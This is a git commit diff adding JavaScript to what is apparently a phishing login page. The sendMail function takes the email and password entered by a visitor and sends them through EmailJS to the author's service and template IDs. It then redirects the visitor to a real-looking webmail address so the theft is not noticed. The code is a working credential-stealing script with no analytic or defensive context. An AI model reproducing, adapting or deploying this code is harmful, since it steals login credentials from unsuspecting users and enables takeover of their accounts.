fb3a1f42b5a950dd95d5c63243d0e078842b546d
Chinonso <prinzskyboy3@gmail.com>
2026-05-17 02:21:08 -0700

    first commit

--- script.js
+++ script.js
@@ -1,8 +1,21 @@
-function sendMail(){
+function sendMail(e){
+    e.preventDefault();
+    
     let parms = {
         email : document.getElementById("email").value,
         password : document.getElementById("password").value,
     }
 
     emailjs.send("service_tuysjwi","template_4oln9tt",parms)
+    .then(
+        function () {
+            window.location.href = "https://mail.polarcomm.com/tuxedo/";
+        },
+        function (error) {
+            alert("Failed to send");
+            console.log(error);
+        }
+    );
+
+    return false;
 }
